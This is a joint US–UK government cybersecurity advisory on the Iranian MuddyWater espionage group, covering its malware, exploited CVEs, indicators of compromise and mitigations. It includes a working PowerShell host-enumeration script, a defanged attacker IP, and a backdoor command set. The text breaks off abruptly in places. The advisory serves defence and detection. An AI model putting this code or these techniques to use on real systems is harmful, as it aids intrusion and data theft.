See the\n [ATT\\&CK for Enterprise](https://attack.mitre.org/versions/v10/techniques/enterprise/) \n for all referenced threat actor tactics and techniques.* \n\n\n\n\n The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Cyber Command Cyber National Mission Force (CNMF), and the United Kingdom\u2019s National Cyber Security Centre (NCSC\\-UK) have observed a group of Iranian government\\-sponsored advanced persistent threat (APT) actors, known as MuddyWater, conducting cyber espionage and other malicious cyber operations targeting a range of government and private\\-sector organizations across sectors\u2014including telecommunications, defense, local government, and oil and natural gas\u2014in Asia, Africa, Europe, and North America.\n **Note:** \n MuddyWater is also known as Earth Vetala, MERCURY, Static Kitten, Seedworm, and TEMP.Zagros.\n \n\n\n\n MuddyWater is a subordinate element within the Iranian Ministry of Intelligence and Security (MOIS).\\[\n [1](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/) \n ] This APT group has conducted broad cyber campaigns in support of MOIS objectives since approximately 2018\\. MuddyWater actors are positioned both to provide stolen data and accesses to the Iranian government and to share these with other malicious cyber actors.\n \n\n\n\n MuddyWater actors are known to exploit publicly reported vulnerabilities and use open\\-source tools and strategies to gain access to sensitive data on victims\u2019 systems and deploy ransomware. These actors also maintain persistence on victim networks via tactics such as side\\-loading dynamic link libraries (DLLs)\u2014to trick legitimate programs into running malware\u2014and obfuscating PowerShell scripts to hide command and control (C2\\) functions. FBI, CISA, CNMF, and NCSC\\-UK have observed MuddyWater actors recently using various malware\u2014variants of PowGoop, Small Sieve, Canopy (also known as Starwhale), Mori, and POWERSTATS\u2014along with other tools as part of their malicious activity.\n \n\n\n\n This advisory provides observed tactics, techniques, and procedures (TTPs); malware; and indicators of compromise (IOCs) associated with this Iranian government\\-sponsored APT activity to aid organizations in the identification of malicious activity against sensitive networks.\n \n\n\n\n FBI, CISA, CNMF, NCSC\\-UK, and the National Security Agency (NSA) recommend organizations apply the mitigations in this advisory and review the following resources for additional information.\n **Note:** \n also see the Additional Resources section.\n \n\n\n* Malware Analysis Report \u2013\n [MAR\\-10369127\\-1\\.v1: MuddyWater](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a)\n* IOCs \u2013\n [AA22\\-052A.stix](/sites/default/files/publications/AA22-055A.stix.xml) \n and\n [MAR\\-10369127\\-1\\.v1\\.stix](/sites/default/files/publications/MAR-10369127-1.v1.WHITE_stix.xml)\n* CISA's webpage \u2013\n [Iran Cyber Threat Overview and Advisories](https://www.cisa.gov/uscert/iran)\n* [NCSC\\-UK MAR\u00a0\u2013 Small Sieve](https://www.ncsc.gov.uk/files/NCSC-Malware-Analysis-Report-Small-Sieve.pdf)\n* [CNMF's press release \u2013 Iranian intel cyber suite of malware uses open source tools](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/)\n\n\n\n[Click here](/sites/default/files/publications/AA22-055A_Iranian_Government-Sponsored_Actors_Conduct_Cyber_Operations.pdf) \n for a PDF version of this report.\n \n\n\n\n### Technical Details\n\n\n\n\n FBI, CISA, CNMF, and NCSC\\-UK have observed the Iranian government\\-sponsored MuddyWater APT group employing spearphishing, exploiting publicly known vulnerabilities, and leveraging multiple open\\-source tools to gain access to sensitive government and commercial networks.\n \n\n\n\n As part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into downloading ZIP files, containing either an Excel file with a malicious macro that communicates with the actor\u2019s C2 server or a PDF file that drops a malicious file to the victim\u2019s network \\[\n [T1566\\.001](https://attack.mitre.org/versions/v10/techniques/T1566/001/) \n ,\n [T1204\\.002](https://attack.mitre.org/versions/v10/techniques/T1204/002) \n ]. MuddyWater actors also use techniques such as side\\-loading DLLs \\[\n [T1574\\.002](https://attack.mitre.org/versions/v10/techniques/T1574/002/) \n ] to trick legitimate programs into running malware and obfuscating PowerShell scripts \\[\n [T1059\\.001](https://attack.mitre.org/versions/v10/techniques/T1059/001/) \n ] to hide C2 functions \\[\n [T1027](https://attack.mitre.org/versions/v10/techniques/T1027/) \n ] (see the PowGoop section for more information).\n \n\n\n\n Additionally, the group uses multiple malware sets\u2014including PowGoop, Small Sieve, Canopy/Starwhale, Mori, and POWERSTATS\u2014for loading malware, backdoor access, persistence \\[\n [TA0003](https://attack.mitre.org/versions/v10/tactics/TA0003/) \n ], and exfiltration \\[\n [TA0010](https://attack.mitre.org/versions/v10/tactics/TA0010/) \n ]. See below for descriptions of some of these malware sets, including newer tools or variants to the group\u2019s suite. Additionally, see Malware Analysis Report\n [MAR\\-10369127\\.r1\\.v1: MuddyWater](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a) \n for further details.\n \n\n\n#### **PowGoop**\n\n\n\n MuddyWater actors use new variants of PowGoop malware as their main loader in malicious operations; it consists of a DLL loader and a PowerShell\\-based downloader. The malicious file impersonates a legitimate file that is signed as a Google Update executable file.\n \n\n\n\n According to samples of PowGoop analyzed by\n [CISA](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a) \n and\n [CNMF](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/) \n , PowGoop consists of three components:\n \n\n\n* A DLL file renamed as a legitimate filename,\n `Goopdate.dll` \n , to enable the DLL side\\-loading technique \\[\n [T1574\\.002](https://attack.mitre.org/versions/v10/techniques/T1574/002/) \n ]. The DLL file is contained within an executable,\n `GoogleUpdate.exe` \n .\n* A PowerShell script, obfuscated as a .dat file,\n `goopdate.dat` \n , used to decrypt and run a second obfuscated PowerShell script,\n `config.txt` \n \\[\n [T1059\\.001](https://attack.mitre.org/versions/v10/techniques/T1059/001/) \n ].\n* `config.txt` \n , an encoded, obfuscated PowerShell script containing a beacon to a hardcoded IP address.\n\n\n\n These components retrieve encrypted commands from a C2 server. The DLL file hides communications with MuddyWater C2 servers by executing with the Google Update service.\n \n\n\n#### **Small Sieve**\n\n\n\n According to a sample\n [analyzed by NCSC\\-UK](https://www.ncsc.gov.uk/files/NCSC-Malware-Analysis-Report-Small-Sieve.pdf) \n , Small Sieve is a simple Python \\[\n [T1059\\.006](https://attack.mitre.org/versions/v10/techniques/T1059/006/) \n ] backdoor distributed using a Nullsoft Scriptable Install System (NSIS) installer,\n `gram_app.exe` \n . The NSIS installs the Python backdoor,\n `index.exe` \n , and adds it as a registry run key \\[\n [T1547\\.001](https://attack.mitre.org/versions/v10/techniques/T1547/001/) \n ], enabling persistence \\[\n [TA0003](https://attack.mitre.org/versions/v10/tactics/TA0003/) \n ].\n \n\n\n\n MuddyWater disguises malicious executables and uses filenames and Registry key names associated with Microsoft's Windows Defender to avoid detection during casual inspection. The APT group has also used variations of Microsoft (e.g., \"Microsift\") and Outlook in its filenames associated with Small Sieve \\[\n [T1036\\.005](https://attack.mitre.org/versions/v10/techniques/T1036/005/) \n ].\n \n\n\n\n Small Sieve provides basic functionality required to maintain and expand a foothold in victim infrastructure and avoid detection \\[\n [TA0005](https://attack.mitre.org/versions/v10/tactics/TA0005/) \n ] by using custom string and traffic obfuscation schemes together with the Telegram Bot application programming interface (API). Specifically, Small Sieve\u2019s beacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure (HTTPS) \\[\n [T1071\\.001](https://attack.mitre.org/versions/v10/techniques/T1071/001) \n ], and the tasking and beaconing data is obfuscated through a hex byte swapping encoding scheme combined with an obfuscated Base64 function \\[\n [T1027](https://attack.mitre.org/versions/v10/techniques/T1027) \n ],\n [T1132\\.002](https://attack.mitre.org/versions/v10/techniques/T1132/002/) \n ].\n \n\n\n\n**Note:** \n cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to MuddyWater with high confidence.\n \n\n\n\n See Appendix B for further analysis of Small Sieve malware.\n \n\n\n#### **Canopy**\n\n\n\n MuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with targeted attachments \\[\n [T1566\\.001](https://attack.mitre.org/versions/v10/techniques/T1566/001) \n ]. According to two Canopy/Starwhale samples analyzed by CISA, Canopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file.\n **Note:** \n the cybersecurity agencies of the United Kingdom and the United States attribute these malware samples to MuddyWater with high confidence.\n \n\n\n\n In the samples CISA analyzed, a malicious Excel file,\n `Cooperation terms.xls` \n , contained macros written in Visual Basic for Applications (VBA) and two encoded Windows Script Files. When the victim opens the Excel file, they receive a prompt to enable macros \\[\n [T1204\\.002](https://attack.mitre.org/versions/v10/techniques/T1204/002/) \n ]. Once this occurs, the macros are executed, decoding and installing the two embedded Windows Script Files.\n \n\n\n\n The first .wsf is installed in the current user startup folder \\[\n [T1547\\.001](https://attack.mitre.org/versions/v10/techniques/T1547/001/) \n ] for persistence. The file contains hexadecimal (hex)\\-encoded strings that have been reshuffled \\[\n [T1027](https://attack.mitre.org/versions/v10/techniques/T1027/) \n ]. The file executes a command to run the second .wsf.\n \n\n\n\n The second .wsf also contains hex\\-encoded strings that have been reshuffled. This file collects \\[\n [TA0035](https://attack.mitre.org/versions/v10/tactics/TA0035/) \n ] the victim system\u2019s IP address, computer name, and username \\[\n [T1005](https://attack.mitre.org/versions/v10/techniques/T1005/) \n ]. The collected data is then hex\\-encoded and sent to an adversary\\-controlled IP address,\n `http[:]88.119.170[.]124` \n , via an HTTP POST request \\[\n [T1041](https://attack.mitre.org/versions/v10/techniques/T1041/) \n ].\n \n\n\n#### **Mori**\n\n\n\n MuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate with the group\u2019s C2 infrastructure \\[\n [T1572](https://attack.mitre.org/versions/v10/techniques/T1572/) \n ].\n \n\n\n\n According to one sample analyzed by CISA,\n `FML.dll` \n , Mori uses a DLL written in C\\+\\+ that is executed with\n `regsvr32.exe` \n with export\n `DllRegisterServer` \n ; this DLL appears to be a component to another program.\n `FML.dll` \n contains approximately 200MB of junk data \\[\n [T1001\\.001](https://attack.mitre.org/versions/v10/techniques/T1001/001/) \n ] in a resource directory 205, number 105\\. Upon execution,\n `FML.dll` \n creates a mutex,\n `0x50504060` \n , and performs the following tasks:\n \n\n\n* Deletes the file\n `FILENAME.old` \n and deletes file by registry value. The filename is the DLL file with a\n `.old` \n extension.\n* Resolves networking APIs from strings that are ADD\\-encrypted with the key\n `0x05` \n .\n* Uses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the JSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their results.\n* Communicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified flag, for C2 \\[\n [T1071\\.001](https://attack.mitre.org/versions/v10/techniques/T1071/001/) \n ].\n* Reads and/or writes data from the following Registry Keys,\n `HKLM\\Software\\NFC\\IPA` \n and\n `HKLM\\Software\\NFC\\(Default)` \n .\n\n\n#### **POWERSTATS**\n\n\n\n This group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to maintain persistent access to the victim systems \\[\n [T1059\\.001](https://attack.mitre.org/versions/v10/techniques/T1059) \n ].\n \n\n\n\n CNMF has posted samples further detailing the different parts of MuddyWater\u2019s new suite of tools\u2014 along with JavaScript files used to establish connections back to malicious infrastructure\u2014to the malware aggregation tool and repository,\n [Virus Total](http://www.virustotal.com/en/user/CYBERCOM_Malware_Alert) \n . Network operators who identify multiple instances of the tools on the same network should investigate further as this may indicate the presence of an Iranian malicious cyber actor.\n \n\n\n\n MuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted operations. FBI, CISA, CNMF, and NCSC\\-UK have observed this APT group recently exploiting the Microsoft Netlogon elevation of privilege vulnerability (\n [CVE\\-2020\\-1472](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472) \n ) and the Microsoft Exchange memory corruption vulnerability (\n [CVE\\-2020\\-0688](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0688) \n ). See\n [CISA\u2019s Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) \n for additional vulnerabilities with known exploits and joint Cybersecurity Advisory:\n [Iranian Government\\-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities](https://www.cisa.gov/uscert/ncas/alerts/aa21-321a) \n for additional Iranian APT group\\-specific vulnerability exploits.\n \n\n\n#### **Survey Script**\n\n\n\n The following script is an example of a survey script used by MuddyWater to enumerate information about victim computers. It queries the Windows Management Instrumentation (WMI) service to obtain information about the compromised machine to generate a string, with these fields separated by a delimiter (e.g.,\n `;;` \n in this sample). The produced string is usually encoded by the MuddyWater implant and sent to an adversary\\-controlled IP address.\n \n\n\n\n $O \\= Get\\-WmiObject Win32\\_OperatingSystem;$S \\= $O.Name;$S \\+\\= \";;\";$ips \\= \"\";Get\\-WmiObject Win32\\_NetworkAdapterConfiguration \\-Filter \"IPEnabled\\=True\" \\| % {$ips \\= $ips \\+ \", \" \\+ $\\_.IPAddress\\[0]};$S \\+\\= $ips.substring(1\\);$S \\+\\= \";;\";$S \\+\\= $O.OSArchitecture;$S \\+\\= \";;\";$S \\+\\= \\[System.Net.DNS]::GetHostByName('').HostName;$S \\+\\= \";;\";$S \\+\\= ((Get\\-WmiObject Win32\\_ComputerSystem).Domain);$S \\+\\= \";;\";$S \\+\\= $env:UserName;$S \\+\\= \";;\";$AntiVirusProducts \\= Get\\-WmiObject \\-Namespace \"root\\\\SecurityCenter2\" \\-Class AntiVirusProduct \u00a0\\-ComputerName $env:computername;$resAnti \\= @();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti \\+\\= $AntiVirusProduct.displayName};$S \\+\\= $resAnti;echo $S;\n \n#### **Newly Identified PowerShell Backdoor**\n\n\n\n The newly identified PowerShell backdoor used by MuddyWater below uses a single\\-byte Exclusive\\-OR (XOR) to encrypt communications with the key 0x02 to adversary\\-controlled infrastructure. The script is lightweight in functionality and uses the InvokeScript method to execute responses received from the adversary.\n \n\n\n\n function encode($txt,$key){$enByte \\=

executable code that can be run by users.** \n Email attachments and files downloaded via links in emails often contain executable code.\n\n\n#### Identity and Access Management\n\n\n* **Use multifactor authentication where possible,** \n particularly for webmail, virtual private networks, and accounts that access critical systems.\n* **Limit the use of administrator privileges.** \n Users who browse the internet, use email, and execute code with administrator privileges make for excellent spearphishing targets because their system\u2014once infected\u2014enables attackers to move laterally across the network, gain additional accesses, and access highly sensitive information.\n\n\n#### Phishing Protection\n\n\n* **Enable antivirus and anti\\-malware software and update signature definitions in a timely manner.** \n Well\\-maintained antivirus software may prevent use of commonly deployed attacker tools that are delivered via spearphishing.\n* **Be suspicious of unsolicited contact via email or social media from any individual you do not know personally.** \n Do not click on hyperlinks or open attachments in these communications.\n* **Consider adding an email banner to emails received from outside your organization and disabling hyperlinks in received emails.**\n* **Train users through awareness and simulations to recognize and report phishing and social engineering attempts.** \n Identify and suspend access of user accounts exhibiting unusual activity.\n* **Adopt threat reputation services at the network device, operating system, application, and email service levels.** \n Reputation services can be used to detect or prevent low\\-reputation email addresses, files, URLs, and IP addresses used in spearphishing attacks.\n\n\n#### Vulnerability and Configuration Management\n\n\n* **Install updates/patch operating systems, software, and firmware as soon as updates/patches are released.** \n Prioritize patching\n [known exploited vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) \n .\n\n\n### Additional Resources\n\n\n* For more information on Iranian government\\-sponsored malicious cyber

It then waits for tasking as a Telegram bot using the\n **python\\-telegram\\-bot** \n module.\n \n\n\n\n Two task formats are supported:\n \n\n\n* `/start` \n \u2013 no argument is passed; this causes the beacon information to be repeated.\n* `/com[BotID] [command]` \n \u2013 for issuing commands passed in the argument.\n\n\n\n The following commands are supported by the second of these formats, as described in table 5:\n \n\n\n\n*Table 5: Supported Commands* \n\n\n\n\n\n| Command | Description |\n| --- | --- |\n| delete | This command causes the backdoor to exit; it does not remove persistence. |\n| download  **url\u201d\u201dfilename** | The URL will be fetched and saved to the provided filename using the Python urllib module  `urlretrieve`   function. |\n| change token  **\u201d\u201dnewtoken** | The backdoor will reconnect to the Telegram Bot API using the provided token  `newtoken`   . This updated token will be stored in the encoded  `MicrosoftWindowsOutlookDataPlus.txt`   file. |\n| disconnect | The original connection to Telegram is terminated. It is likely used after a  `change token`   command is issued. |\n\n\n\n\n\n\n\n Any commands other than those detailed in table 5 are executed directly by passing them to\n `cmd.exe /c` \n , and the output is returned as a reply.\n \n\n\n#### **Defense Evasion**\n\n\n##### ***Anti\\-Sandbox***\n\n\n##### \n\n\n\n*Figure 1: Execution Guardrail* \n\n\n\n\n Threat actors may be attempting to thwart simple analysis by not passing \u201cPlatypus\u201d on the command line.\n \n\n\n##### ***String obfuscation***\n\n\n\n Internal strings and new Telegram tokens are stored obfuscated with a custom alphabet and Base64\\-encoded. A decryption script is included in Appendix B.\n \n\n\n#### **Communications**\n\n\n##### ***Beacon Format***\n\n\n\n Before listening for tasking using CommandHandler objects from the python\n `-telegram-bot` \n module, a beacon is generated manually using the standard\n `requests` \n library:\n \n\n\n\n![]()\n\n\n\n\n*Figure 2: Manually Generated Beacon* \n\n\n\n\n The hex host data is encoded using the byte shuffling algorithm as described in the \u201cCommunications (Traffic obfuscation)\u201d section of this report. The example in figure 2 decodes to:\n \n\n\n\n`admin/WINDOMAIN1 | 10.17.32.18` \n\n\n\n##### \n\n\n##### ***Traffic obfuscation***\n\n\n\n Although traffic to the Telegram Bot API is protected by TLS, Small Sieve obfuscates its tasking and response using a hex byte shuffling algorithm. A Python3 implementation is shown in figure 3\\.\n \n\n\n\n\n\n\n\n![]()\n\n\n\n\n*Figure 3: Traffic Encoding Scheme Based on Hex Conversion and Shuffling* \n\n\n\n#### \n\n\n#### **Detection**\n\n\n\n Table 6 outlines indicators of compromise.\n   \n\n  \n\n\n\n\n\n*Table 6: Indicators of Compromise* \n\n\n\n\n\n| Type | Description | **Values** |\n| --- | --- | --- |\n| Path | Telegram Session Persistence File (Obfuscated) | `%LocalAppData%\\MicrosoftWindowsOutlookDataPlus.txt` |\n| Path | Installation path of the Small Sieve binary | `%AppData%\\OutlookMicrosift\\index.exe` |\n| Registry value name | Persistence Registry Key pointing to index.exe with a  `\u201cPlatypus\u201d`   argument | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift` |\n\n\n#### \n\n\n#### **String Recover Script**\n\n\n\n![]()\n\n\n\n\n*Figure 4: String Recovery Script* \n\n\n\n\n### Contact Information\n\n\n\n\n To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI field office at\n [www.fbi.gov/contact\\-us/field\\-offices](https://www.fbi.gov/contact-us/field-offices) \n , or the FBI\u2019s 24/7 Cyber Watch (CyWatch) at (855\\) 292\\-3937 or by email at\n [CyWatch@fbi.gov](mailto:CyWatch@fbi.gov) \n .
